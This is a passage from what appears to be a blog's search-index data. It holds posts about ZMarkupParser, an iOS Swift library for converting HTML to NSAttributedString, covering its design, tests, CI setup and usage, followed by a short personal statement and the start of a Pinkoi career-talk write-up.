below:Not perfect, but acceptable.Complex Rendering Items — ImagesFinally, the biggest challenge is loading remote images into NSAttributedString.Using &lt;img&gt; in HTML to represent an image:&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\" width=\"300\" height=\"125\"/&gt;You can specify the desired display size through the width / height HTML attributes.Displaying images in NSAttributedString is more complex than expected, and there isn’t a perfect implementation. Previously, when working on UITextView text wrapping, I encountered some pitfalls, but after further research, I found that there still isn’t a perfect solution.Currently, we ignore the native NSTextAttachment’s inability to reuse and release memory issues, and instead implement downloading images from remote sources, placing them into NSTextAttachment, and ensuring content updates automatically.This series of operations has been broken down into another small project for easier optimization and reuse in other projects:The main reference is the series of articles on Asynchronous NSTextAttachments, but I modified the final content update part (after downloading, the UI needs to refresh to display) and added Delegate/DataSource for external extensibility.The operational flow and relationships are as follows: Declare a ZNSTextAttachmentable object that encapsulates the NSTextStorage object (which UITextView has) and the UILabel itself (since UILabel lacks NSTextStorage). The operation method is solely to implement replace attributedString from NSRange. (func replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment)) The principle is to first use ZNSTextAttachment to wrap the imageURL, PlaceholderImage, and the size information to be displayed, then directly show the image using the placeholder. When the system requires this image on the screen, it will call the image(forBounds…) method, at which point we start downloading the image data. The DataSource allows external customization for how to download or implement image cache policies, with the default being a direct URLSession request for image data. After downloading, a new ZResizableNSTextAttachment is created, and the logic for setting the custom image size is implemented in attachmentBounds(for…). Call the replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) method to replace the position of ZNSTextAttachment with ZResizableNSTextAttachment. Emit a didLoad Delegate notification, allowing external connections if needed. Done. For detailed code, refer to the Source Code.The reason for not using NSLayoutManager.invalidateLayout(forCharacterRange: range, actualCharacterRange: nil) or NSLayoutManager.invalidateDisplay(forCharacterRange: range) to refresh the UI is that it was found that the UI did not correctly display updates; since we already know the range, directly triggering the replacement of NSAttributedString ensures the UI updates correctly.The final display result is as follows:&lt;span style=\"color:red\"&gt;こんにちは&lt;/span&gt;こんにちはこんにちは &lt;br /&gt;&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\"/&gt;Testing &amp; Continuous IntegrationThis project not only involved writing unit tests but also established snapshot tests for integration testing, making it easier to compare the final NSAttributedString in a comprehensive manner.The main functional logic is covered by unit tests, along with integration tests, resulting in a final Test Coverage of around 85%.ZMarkupParser — codecovSnapshot TestDirectly import the framework:import SnapshotTesting// ...func testShouldKeepNSAttributedString() { let parser = ZHTMLParserBuilder.initWithDefault().build() let textView = UITextView() textView.frame.size.width = 390 textView.isScrollEnabled = false textView.backgroundColor = .white textView.setHtmlString(\"html string...\", with: parser) textView.layoutIfNeeded() assertSnapshot(matching: textView, as: .image, record: false)}// ...This directly compares the final result to ensure that adjustments made during integration do not cause any issues.Codecov Test CoverageIntegrating with Codecov.io (free for public repositories) allows for evaluating test coverage. You just need to install the Codecov GitHub App and set it up.Once the Codecov and GitHub repository are set up, you can also add a codecov.yml file in the root directory:comment: # this is a top-level key layout: \"reach, diff, flags, files\" behavior: default require_changes: false # if true: only post the comment if coverage changes require_base: no # [yes :: must have a base report to post] require_head: yes # [yes :: must have a head report to post]This configuration enables automatic comments on the CI results after each PR is submitted.Continuous IntegrationGitHub Action CI integration: ci.ymlname: CIon: workflow_dispatch: pull_request: types: [opened, reopened] push: branches: - mainjobs: build: runs-on: self-hosted steps: - uses: actions/checkout@v3 - name: spm build and test run: | set -o pipefail xcodebuild test -workspace ZMarkupParser.xcworkspace -testPlan ZMarkupParser -scheme ZMarkupParser -enableCodeCoverage YES -resultBundlePath './scripts/TestResult.xcresult' -destination 'platform=iOS Simulator,name=iPhone 14,OS=16.1' build test | xcpretty - name: Codecov uses: codecov/codecov-action@v3.1.1 with: xcode: true xcode_archive_path: './scripts/TestResult.xcresult'This configuration runs the build and test when a PR is opened/reopened or when pushing to the main branch, and uploads the test coverage report to Codecov.RegexRegarding regular expressions, each time I use them, I refine my understanding; although I didn’t use them extensively this time, I initially wanted to extract paired HTML tags, which led me to research how to write them.Here are some cheat sheet notes from what I learned this time: ?: allows ( ) to match group results without capturing them.e.g. (?:https?:\\/\\/)?(?:www\\.)?example\\.com will return the entire URL in https://www.example.com instead of just https:// and www. .+? performs a non-greedy match (returns the closest match).e.g. &lt;.+?&gt; will return &lt;a&gt; and &lt;/a&gt; in &lt;a&gt;test&lt;/a&gt; instead of the entire string. (?=XYZ) matches any string until the string XYZ appears; note that [^XYZ] represents any string until the characters X, Y, or Z appear.e.g. (?:__)(.+?(?=__))(?:__) (matches any string until __) will match test. ?R recursively looks for values that match the same rule.e.g. \\((?:[^()]|((?R)))+\\) will match (simple) and (and(nested)) in (simple) (and(nested)), including (nested). ?&lt;GroupName&gt; … \\k&lt;GroupName&gt; matches the previous group name.e.g. (?&lt;tagName&gt;&lt;a&gt;).*(\\k&lt;GroupName&gt;) (?(X)yes|no) matches the condition yes if the Xth match has a value (can also use group names), otherwise matches no.Swift does not currently support this.Other good Regex resources: Swift Regex Quick Reference How Regular Expressions Work -&gt; Refer to this when optimizing regex performance in this project. Regex Errors Leading to Infinite Searches, Causing Server Failures Regex101 for all regex rulesSwift Package Manager &amp; CocoapodsThis was also my first time developing with SPM and Cocoapods… it was quite interesting. SPM is really convenient; however, if two projects depend on the same package, opening both projects simultaneously can lead to one of them not finding the package and failing to build.Cocoapods has uploaded ZMarkupParser, but I haven’t tested its functionality since I used SPM. 😝ChatGPTIn my actual development experience, I found it most useful for assisting with editing the README. I haven’t felt a significant impact during development; when asking mid-senior level questions, it often doesn’t provide accurate answers and sometimes gives incorrect ones (I encountered this when asking about regex rules, and the answers were not quite right). So, I ultimately returned to Google for accurate solutions.Not to mention asking it to write code; unless it’s for simple code generation objects, don’t expect it to complete an entire tool structure. (At least for now, it seems that Copilot might be more helpful for writing code.)However, it can provide a general direction for knowledge gaps, allowing us to quickly understand how certain things should be done. Sometimes, when our grasp is too weak, it can be difficult to quickly locate the correct direction on Google, and that’s when ChatGPT becomes quite helpful.DeclarationAfter more than three months of research and development, I am exhausted, but I want to clarify that this approach is merely a feasible result of my research and may not be the best solution or may still have areas for optimization. This project is more like a stepping stone, hoping to achieve a perfect solution for converting a markup language to NSAttributedString. Contributions are very welcome; many aspects still need the power of the community to improve.ContributingZMarkupParser ⭐Here are some areas I think could be improved as of now (2023/03/12), which I will document in the repo: Performance/algorithm optimization; although it’s faster and more stable than the native NSAttributedString.DocumentType.html, there is still room for improvement. I believe its performance is definitely not on par with XMLParser. I hope one day it can achieve the same performance while maintaining customization and automatic error correction. Support for more HTML tags and style attribute conversions. Further optimization of ZNSTextAttachment to implement reuse capabilities and release memory; may need to research CoreText. Support for Markdown parsing, as the underlying abstraction is not limited to HTML; thus, once the Markdown to Markup object is established, Markdown parsing can be completed. That’s why I named it ZMarkupParser instead of ZHTMLParser, hoping that one day it can also support Markdown to NSAttributedString. Support for Any to Any conversions, e.g., HTML to Markdown, Markdown to HTML, since we have the original AST tree (Markup object), so implementing conversions between any markup is possible. Implement CSS !important functionality to enhance the inheritance strategy of MarkupStyle. Strengthen HTML Selector functionality; currently, it only has the most basic filtering capabilities. So many more improvements; feel free to open an issue. If you feel you can’t contribute but want to help, you can give me a ⭐ to make the repo more visible, which may lead to contributions from GitHub experts!SummaryZMarkupParserThis concludes all the technical details and my journey in developing ZMarkupParser. It took me nearly three months of after-work and weekend time, countless research and practical processes, writing tests, improving test coverage, and establishing CI; finally, I have a somewhat presentable result. I hope this tool helps those who face similar challenges, and I look forward to everyone working together to make it even better.pinkoi.comCurrently, it is applied in our company’s iOS app on pinkoi.com, and I haven’t encountered any issues. 😄Further Reading ZMarkupParser HTML String to NSAttributedString Converter Tool String Rendering Asynchronous NSTextAttachmentsIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,233 Total Views Last Statistics Date: 2025-08-15 | 1,231 Views on Medium." }, { "title": "ZMarkupParser HTML String 轉換 NSAttributedString 工具", "url": "/posts/zrealm-dev/zmarkupparser-html-string-%E8%BD%89%E6%8F%9B-nsattributedstring-%E5%B7%A5%E5%85%B7-a5643de271e4/", "categories": "ZRealm Dev.", "tags": "html-parser, nsattributedstring, ios-app-development, html, markdown", "date": "2023-02-26 17:03:07 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZMarkupParser HTML String 轉換 NSAttributedString 工具轉換 HTML String 成 NSAttributedString 對應 Key 樣式設定ZhgChgLi / ZMark...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZMarkupParser HTML String 轉換 NSAttributedString 工具轉換 HTML String 成 NSAttributedString 對應 Key 樣式設定ZhgChgLi / ZMarkupParserZhgChgLi / ZMarkupParser功能 使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。 支援 HTML Render (to NSAttributedString) / Stripper (剝離 HTML Tag) / Selector 功能 自動分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)&lt;br&gt; -&gt; &lt;br/&gt; &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; -&gt; &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/i&gt;&lt;/b&gt;&lt;i&gt;Italic&lt;/i&gt; &lt;Congratulation!&gt; -&gt; &lt;Congratulation!&gt; (treat as String) 支援客製化樣式指定e.g. &lt;b&gt;&lt;/b&gt; -&gt; weight: .semilbold &amp; underline: 1 支援自行擴充 HTML Tag 解析e.g. 解析 &lt;zhgchgli&gt;&lt;/zhgchgli&gt; 成想要的樣式 包含架構設計，方便對 HTML Tag 進行擴充目前純了支援基本的樣式之外還支援 ul/ol/li 列表及 hr 分隔線渲染，未來要擴充支援其他 HTML Tag 也能快速支援 支援從 style HTML Attribute 擴充解析樣式HTML 可以從 style 指定文字樣式，同樣的，此套件也能支援從 style 中指定樣式e.g. &lt;b style=”font-size: 20px”&gt;&lt;/b&gt; -&gt; 粗體+字型 20 px 支援 iOS/macOS 支援 HTML Color Name to UIColor/NSColor Test Coverage: 80%+ 支援 &lt;img&gt; 圖片、 &lt;ul&gt; 項目清單、 &lt;table&gt; 表格…等等 HTMLTag 解析 比 NSAttributedString.DocumentType.html 更高的效能效能分析Performance Benchmark 測試環境：2022/M2/24GB Memory/macOS 13.2/XCode 14.1 X 軸：HTML 字數 Y 軸：渲染所花時間(秒)*另外 NSAttributedString.DocumentType.html 超過 54,600+ 長度字串就會閃退 (EXC_BAD_ACCESS)。試玩可直接下載專案打開 ZMarkupParser.xcworkspace 選擇 ZMarkupParser-Demo Target Build &amp; Run 直接測試效果。安裝支援 SPM/Cocoapods ，請參考 Readme 。使用方式樣式宣告MarkupStyle/MarkupStyleColor/MarkupStyleParagraphStyle，對應 NSAttributedString.Key 的封裝。var font:MarkupStyleFontvar paragraphStyle:MarkupStyleParagraphStylevar foregroundColor:MarkupStyleColor? = nilvar backgroundColor:MarkupStyleColor? = nilvar ligature:NSNumber? = nilvar kern:NSNumber? = nilvar tracking:NSNumber? = nilvar strikethroughStyle:NSUnderlineStyle? = nilvar underlineStyle:NSUnderlineStyle? = nilvar strokeColor:MarkupStyleColor? = nilvar strokeWidth:NSNumber? = nilvar shadow:NSShadow? = nilvar textEffect:String? = nilvar attachment:NSTextAttachment? = nilvar link:URL? = nilvar baselineOffset:NSNumber? = nilvar underlineColor:MarkupStyleColor? = nilvar strikethroughColor:MarkupStyleColor? = nilvar obliqueness:NSNumber? = nilvar expansion:NSNumber? = nilvar writingDirection:NSNumber? = nilvar verticalGlyphForm:NSNumber? = nil...可依照自己想套用到 HTML Tag 上對應的樣式自行宣告：let myStyle = MarkupStyle(font: MarkupStyleFont(size: 13), backgroundColor: MarkupStyleColor(name: .aquamarine))HTML Tag宣告要渲染的 HTML Tag 與對應的 Markup Style，目前預定義的 HTML Tag Name 如下：A_HTMLTagName(), // &lt;a&gt;&lt;/a&gt;B_HTMLTagName(), // &lt;b&gt;&lt;/b&gt;BR_HTMLTagName(), // &lt;br&gt;&lt;/br&gt;DIV_HTMLTagName(), // &lt;div&gt;&lt;/div&gt;HR_HTMLTagName(), // &lt;hr&gt;&lt;/hr&gt;I_HTMLTagName(), // &lt;i&gt;&lt;/i&gt;LI_HTMLTagName(), // &lt;li&gt;&lt;/li&gt;OL_HTMLTagName(), // &lt;ol&gt;&lt;/ol&gt;P_HTMLTagName(), // &lt;p&gt;&lt;/p&gt;SPAN_HTMLTagName(), // &lt;span&gt;&lt;/span&gt;STRONG_HTMLTagName(), // &lt;strong&gt;&lt;/strong&gt;U_HTMLTagName(), // &lt;u&gt;&lt;/u&gt;UL_HTMLTagName(), // &lt;ul&gt;&lt;/ul&gt;DEL_HTMLTagName(), // &lt;del&gt;&lt;/del&gt;IMG_HTMLTagName(handler: ZNSTextAttachmentHandler), // &lt;img&gt; and image downloaderTR_HTMLTagName(), // &lt;tr&gt;TD_HTMLTagName(), // &lt;td&gt;TH_HTMLTagName(), // &lt;th&gt;...and more...這樣解析 &lt;a&gt; Tag 時就會套用到指定的 MarkupStyle。擴充 HTMLTagName：let zhgchgli = ExtendTagName(\"zhgchgli\")HTML Style Attribute如同前述，HTML 支援從 Style Attribute 指定樣式，這邊也抽象出來可指定支援的樣式跟擴充，目前預定義的 HTML Style Attribute 如下：ColorHTMLTagStyleAttribute(), // colorBackgroundColorHTMLTagStyleAttribute(), // background-colorFontSizeHTMLTagStyleAttribute(), // font-sizeFontWeightHTMLTagStyleAttribute(), // font-weightLineHeightHTMLTagStyleAttribute(), // line-heightWordSpacingHTMLTagStyleAttribute(), // word-spacing...擴充 Style Attribute:ExtendHTMLTagStyleAttribute(styleName: \"text-decoration\", render: { value in var newStyle = MarkupStyle() if value == \"underline\" { newStyle.underline = NSUnderlineStyle.single } else { // ... } return newStyle})使用import ZMarkupParserlet parser = ZHTMLParserBuilder.initWithDefault().set(rootStyle: MarkupStyle(font: MarkupStyleFont(size: 13)).build()initWithDefault 會自動加入預先定義的 HTML Tag Name &amp; 預設對應的 MarkupStyle 還有預先定義的 Style Attribute。set(rootStyle:) 可指定整個字串的預設樣式，也可不指定。客製化let parser = ZHTMLParserBuilder.initWithDefault().add(ExtendTagName(\"zhgchgli\"), withCustomStyle: MarkupStyle(backgroundColor: MarkupStyleColor(name: .aquamarine))).build() // will use markupstyle you specify to render extend html tag &lt;zhgchgli&gt;&lt;/zhgchgli&gt;let parser = ZHTMLParserBuilder.initWithDefault().add(B_HTMLTagName(), withCustomStyle: MarkupStyle(font: MarkupStyleFont(size: 18, weight: .style(.semibold)))).build() // will use markupstyle you specify to render &lt;b&gt;&lt;/b&gt; instead of default bold markup styleHTML Renderlet attributedString = parser.render(htmlString) // NSAttributedString// work with UITextViewtextView.setHtmlString(htmlString)// work with UILabellabel.setHtmlString(htmlString)HTML Stripperparser.stripper(htmlString)Selector HTML Stringlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;selector.first(\"a\")?.first(\"b\").attributedString // will return Testselector.filter(\"a\").attributedString // will return Test Link// render from selector resultlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;parser.render(selector.first(\"a\")?.first(\"b\"))Async另外如果要渲染長字串，可改用 async 方法，防止卡 UI。parser.render(String) { _ in }...parser.stripper(String) { _ in }...parser.selector(String) { _ in }...Know-how UITextView 中的超連結樣式是看 linkTextAttributes，所以會出現 NSAttributedString.key 明明有設定但卻沒出現效果的情況。 UILabel 不支援指定 URL 樣式，所以會出現 NSAttributedString.key 明明有設定但卻沒出現效果的情況。 如果要渲染複雜的 HTML，還是需要使用 WKWebView (包含 JS/表格. .渲染)。技術原理及開發故事：「 手工打造 HTML 解析器的那些事 」歡迎貢獻及提出 Issue 將盡快修正有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 803 Total Views Last Statistics Date: 2025-08-15 | 720 Views on Medium." }, { "title": "ZMarkupParser HTML String to NSAttributedString Converter Tool", "url": "/posts/zrealm-dev/en/zmarkupparser-html-string-to-nsattributedstring-converter-tool-a5643de271e4/", "categories": "ZRealm Dev.", "tags": "html-parser, nsattributedstring, ios-app-development, html, markdown", "date": "2023-02-26 17:03:07 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZMarkupParser HTML String to NSAttributedString Converter ToolConvert HTML String to...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZMarkupParser HTML String to NSAttributedString Converter ToolConvert HTML String to NSAttributedString with corresponding key style settings.ZhgChgLi / ZMarkupParserZhgChgLi / ZMarkupParserFeatures Developed entirely in Swift, it uses Regex to parse HTML tags, followed by tokenization to analyze and correct tag validity (fixing unclosed tags and misaligned tags), and finally converts to an abstract syntax tree. The Visitor Pattern is then used to map HTML tags to abstract styles, resulting in the final NSAttributedString output, without relying on any parser libraries. Supports HTML rendering (to NSAttributedString), stripping HTML tags, and selector functionality. Automatically analyzes and corrects tag validity (fixing unclosed tags and misaligned tags):&lt;br&gt; → &lt;br/&gt;&lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; → &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/i&gt;&lt;/b&gt;&lt;i&gt;Italic&lt;/i&gt;&lt;Congratulation!&gt; → &lt;Congratulation!&gt; (treated as a string) Supports custom style specifications, e.g., &lt;b&gt;&lt;/b&gt; → weight: .semibold &amp; underline: 1 Allows for custom HTML tag parsing, e.g., parsing &lt;zhgchgli&gt;&lt;/zhgchgli&gt; into desired styles. Includes a structural design that facilitates HTML tag expansion. Currently, it supports basic styles, as well as rendering for ul/ol/li lists and hr separators. Future expansions will allow for quick support of additional HTML tags. Supports style parsing from style HTML attributes. HTML can specify text styles through style, and this library can also support styles specified in style, e.g., &lt;b style=\"font-size: 20px\"&gt;&lt;/b&gt; → Bold + font size 20 px. Compatible with iOS/macOS. Supports HTML color names to UIColor/NSColor. Test coverage: 80%+ Supports parsing of &lt;img&gt; images, &lt;ul&gt; lists, &lt;table&gt; tables, and more HTML tags. Offers higher performance than NSAttributedString.DocumentType.html.Performance AnalysisPerformance Benchmark Test environment: 2022/M2/24GB Memory/macOS 13.2/XCode 14.1 X-axis: HTML character count Y-axis: Rendering time (seconds)*Additionally, NSAttributedString.DocumentType.html crashes (EXC_BAD_ACCESS) for strings longer than 54,600+ characters.Try It OutYou can directly download the project, open ZMarkupParser.xcworkspace, and select the ZMarkupParser-Demo target to build and run for testing.InstallationSupports SPM/Cocoapods. Please refer to the Readme.UsageStyle DeclarationMarkupStyle/MarkupStyleColor/MarkupStyleParagraphStyle, encapsulating NSAttributedString.Key.var font: MarkupStyleFontvar paragraphStyle: MarkupStyleParagraphStylevar foregroundColor: MarkupStyleColor? = nilvar backgroundColor: MarkupStyleColor? = nilvar ligature: NSNumber? = nilvar kern: NSNumber? = nilvar tracking: NSNumber? = nilvar strikethroughStyle: NSUnderlineStyle? = nilvar underlineStyle: NSUnderlineStyle? = nilvar strokeColor: MarkupStyleColor? = nilvar strokeWidth: NSNumber? = nilvar shadow: NSShadow? = nilvar textEffect: String? = nilvar attachment: NSTextAttachment? = nilvar link: URL? = nilvar baselineOffset: NSNumber? = nilvar underlineColor: MarkupStyleColor? = nilvar strikethroughColor: MarkupStyleColor? = nilvar obliqueness: NSNumber? = nilvar expansion: NSNumber? = nilvar writingDirection: NSNumber? = nilvar verticalGlyphForm: NSNumber? = nil...You can declare styles to apply to HTML tags as desired:let myStyle = MarkupStyle(font: MarkupStyleFont(size: 13), backgroundColor: MarkupStyleColor(name: .aquamarine))HTML TagsDeclare the HTML tags to render and their corresponding Markup Styles. The currently predefined HTML tag names are as follows:A_HTMLTagName(), // &lt;a&gt;&lt;/a&gt;B_HTMLTagName(), // &lt;b&gt;&lt;/b&gt;BR_HTMLTagName(), // &lt;br&gt;&lt;/br&gt;DIV_HTMLTagName(), // &lt;div&gt;&lt;/div&gt;HR_HTMLTagName(), // &lt;hr&gt;&lt;/hr&gt;I_HTMLTagName(), // &lt;i&gt;&lt;/i&gt;LI_HTMLTagName(), // &lt;li&gt;&lt;/li&gt;OL_HTMLTagName(), // &lt;ol&gt;&lt;/ol&gt;P_HTMLTagName(), // &lt;p&gt;&lt;/p&gt;SPAN_HTMLTagName(), // &lt;span&gt;&lt;/span&gt;STRONG_HTMLTagName(), // &lt;strong&gt;&lt;/strong&gt;U_HTMLTagName(), // &lt;u&gt;&lt;/u&gt;UL_HTMLTagName(), // &lt;ul&gt;&lt;/ul&gt;DEL_HTMLTagName(), // &lt;del&gt;&lt;/del&gt;IMG_HTMLTagName(handler: ZNSTextAttachmentHandler), // &lt;img&gt; and image downloaderTR_HTMLTagName(), // &lt;tr&gt;TD_HTMLTagName(), // &lt;td&gt;TH_HTMLTagName(), // &lt;th&gt;...and more...When parsing the &lt;a&gt; tag, the specified MarkupStyle will be applied.To extend HTML tag names:let zhgchgli = ExtendTagName(\"zhgchgli\")HTML Style AttributesAs mentioned earlier, HTML supports specifying styles through style attributes. This is also abstracted to allow for specifying supported styles and extensions. The currently predefined HTML style attributes are as follows:ColorHTMLTagStyleAttribute(), // colorBackgroundColorHTMLTagStyleAttribute(), // background-colorFontSizeHTMLTagStyleAttribute(), // font-sizeFontWeightHTMLTagStyleAttribute(), // font-weightLineHeightHTMLTagStyleAttribute(), // line-heightWordSpacingHTMLTagStyleAttribute(), // word-spacing...To extend style attributes:ExtendHTMLTagStyleAttribute(styleName: \"text-decoration\", render: { value in var newStyle = MarkupStyle() if value == \"underline\" { newStyle.underline = NSUnderlineStyle.single } else { // ... } return newStyle})Usageimport ZMarkupParserlet parser = ZHTMLParserBuilder.initWithDefault().set(rootStyle: MarkupStyle(font: MarkupStyleFont(size: 13)).build()initWithDefault automatically includes predefined HTML tag names, default corresponding MarkupStyles, and predefined style attributes.set(rootStyle:) allows you to specify the default style for the entire string, or you can choose not to specify one.Customizationlet parser = ZHTMLParserBuilder.initWithDefault().add(ExtendTagName(\"zhgchgli\"), withCustomStyle: MarkupStyle(backgroundColor: MarkupStyleColor(name: .aquamarine))).build() // will use the markup style you specify to render the extended HTML tag &lt;zhgchgli&gt;&lt;/zhgchgli&gt;let parser = ZHTMLParserBuilder.initWithDefault().add(B_HTMLTagName(), withCustomStyle: MarkupStyle(font: MarkupStyleFont(size: 18, weight: .style(.semibold)))).build() // will use the markup style you specify to render &lt;b&gt;&lt;/b&gt; instead of the default bold markup styleHTML Renderinglet attributedString = parser.render(htmlString) // NSAttributedString// work with UITextViewtextView.setHtmlString(htmlString)// work with UILabellabel.setHtmlString(htmlString)HTML Strippingparser.stripper(htmlString)Selector HTML Stringlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;selector.first(\"a\")?.first(\"b\").attributedString // will return Testselector.filter(\"a\").attributedString // will return Test Link// render from selector resultlet selector = parser.selector(htmlString) // HTMLSelector e.g. input: &lt;a&gt;&lt;b&gt;Test&lt;/b&gt;Link&lt;/a&gt;parser.render(selector.first(\"a\")?.first(\"b\"))AsyncIf you need to render long strings, you can use the async method to prevent UI blocking.parser.render(String) { _ in }...parser.stripper(String) { _ in }...parser.selector(String) { _ in }...Know-how The hyperlink style in UITextView is determined by linkTextAttributes, which may lead to situations where NSAttributedString.key is set but does not appear to take effect. UILabel does not support specifying URL styles, which may also lead to situations where NSAttributedString.key is set but does not appear to take effect. For rendering complex HTML, it is still necessary to use WKWebView (including JS/table rendering).Technical Principles and Development Story: “The Journey of Building an HTML Parser”Contributions and Issues WelcomeIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 803 Total Views Last Statistics Date: 2025-08-15 | 720 Views on Medium." }, { "title": "Google 出現與本人李仲澄無關之搜尋結果聲明", "url": "/posts/zrealm-life/google-%E5%87%BA%E7%8F%BE%E8%88%87%E6%9C%AC%E4%BA%BA%E6%9D%8E%E4%BB%B2%E6%BE%84%E7%84%A1%E9%97%9C%E4%B9%8B%E6%90%9C%E5%B0%8B%E7%B5%90%E6%9E%9C%E8%81%B2%E6%98%8E-declaration-for-google-search-result/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, 生活, medium", "date": "2023-01-09 08:00:00 +0800", "snippet": "聲明 #1: 技藝專題】寫程式成全民運動！專訪網頁設計金牌李仲澄 #2: 【技藝專題】人才培養做半套，技優生反成四不像聲明人：李仲澄聲明日期：2023/01/09聯繫方式：zhgchgli@gmail.com(因不想增加 Google 對無關的惡意字詞收錄，故使用圖片做為聲明文件)Improve this page on Github.Follow Me on Medium 1K+ Fo...", "content": "聲明 #1: 技藝專題】寫程式成全民運動！專訪網頁設計金牌李仲澄 #2: 【技藝專題】人才培養做半套，技優生反成四不像聲明人：李仲澄聲明日期：2023/01/09聯繫方式：zhgchgli@gmail.com(因不想增加 Google 對無關的惡意字詞收錄，故使用圖片做為聲明文件)Improve this page on Github.Follow Me on Medium 1K+ Followers 71 Total Views" }, { "title": "Pinkoi 2022 Open House for GenZ — 15 Mins Career Talk", "url": "/posts/zrealm-dev/pinkoi-2022-open-house-for-genz-15-mins-career-talk-4b9d09cea5f0/", "categories": "ZRealm Dev.", "tags": "ios-app-development, pinkoi, open-house, tech-career, career-advice", "date": "2022-12-02 16:11:49 +0800", "snippet": "Pinkoi 2022 Open House for GenZ — 15 Mins Career TalkPinkoi Developers’ Night 2022 年末交流會 — 15 分鐘職涯分享演講Pinkoi Developers’ Night 2022 年末交流會活動連結： Linkedin主要聽眾：各大專院校資訊相關科系在校學生地點時間：2022/12/01 7:00 PM — ...", "content": "Pinkoi 2022 Open House for GenZ — 15 Mins Career TalkPinkoi Developers’ Night 2022 年末交流會 — 15 分鐘職涯分享演講Pinkoi Developers’ Night 2022 年末交流會活動連結： Linkedin主要聽眾：各大專院校資訊相關科系在校學生地點時間：2022/12/01 7:00 PM — 9:00 PM分享時長：15 minsAbout Me目前擔任 Pinkoi Platform (App) Engineer Lead 兼 iOS Engineer，之前待過 街聲 、 數字科技( 上櫃 5287)、 新創公司 ；從高職開始自學網站程式設計，曾獲 全國技能競賽 網頁設計職類冠軍及備取國手，畢業於臺灣科技大學資管系，2017 年轉職 iOS App 開發。熱衷於探索與技術交流，也會寫寫日常生活或開箱體驗，歡迎大家追縱我的 Medium Blog 。Pinkoi Engineer 日常 — 產品Pinkoi 產品支援電腦版、手機版、iOS、Android 四種平台及繁體中文、香港繁體、簡體中文、日文、泰文、英文六種語系。幕後有 8+ 個小隊(Squad Team)負責不同面向的工作，例如：Buyer Squad 負責買家端、Seller Squad 負責賣家端、Platform Squad 負責底層、AI Squad 負責算法…等等，一同打造 Pinkoi 產品。Pinkoi Engineer 日常 — 工具請注意：本圖非全面或最新的 Tech Stack工欲善其事必先利其器，上圖列舉了 Pinkoi 開發團隊，背後的 Tech Stack 及有使用到的工具服務；另外也列舉了跨團隊協作工具 Slack、Asana、Figma …等等服務。隨團隊規模人數不斷成長，會有更多時候需要溝通或重複性工作，此時透過引入工具服務，可以很好的解開人與人的連結，增加團隊工作效率。Pinkoi Engineer 日常 — 幕後「功」「臣」在 Pinkoi 雖然工程師被分派在各個 Squad Team 之中，但彼此之間仍會同心協力， Win as a team, 我們都還是同個家庭 。Pinkoi Engineer 日常 — 幕後「功」「臣」同職能的隊友(e.g. iOS/Android/BE/FE/Data…) 除了會定期舉行技術交流分享外，在日常開發上也會互相 Code Review、進行 System Design 討論；一同討論、一齊成長！上圖中間的「乖乖」紋身貼紙，是團隊「 送禮清單 」功能上線及「 2022 Pinkoi Design Fest 風格設計節 」活動的 祈福儀式 ，確保服務平平安安穩穩定定。Engineer 如何幫助推進商業目標？除了完成任務外，Engineer 還有許多能幫助推進商業目標的地方：首先撇開 Engineer 角色的束縛，以自身為出發點；我們可以在專案規劃時期，提出自己生活使用經驗及各種有創意的發想，例如：有觀察到朋友的使用習慣或新流行的酷東西 (e.g. iOS 16 動態島)，集思廣益之下，說不定就能讓本來平凡無奇的功能變成全新的亮點！再來回到工程本身，第一當然是必備的開發能力，好的開發能力能保有擴充及穩定性，減少技術債的產生，減少日後維護成本，變相增進商業價值；同樣地，正確的技術選擇，也能在有限的開發資源下發揮最大的價值；這些都需要很多硬實力及經驗累積。除此之外，發揮溝通協調能力能讓跨工程討論更有效率、發揮協作能力能減少重工發生；都能大大增加團隊產出，更進一步推進商業目標。綜合以上，工程師絕對不是只能靠寫程式創造價值。Engineer 如何幫助推進商業目標？在 Pinkoi，小隊 (Squad Team) 的 Sync-up 或專案討論會議，除工程師之外還會有設計師、PM、分析師，一同參與專案討論；人人都可以提出自己的想法，激發出不同的火花。身為 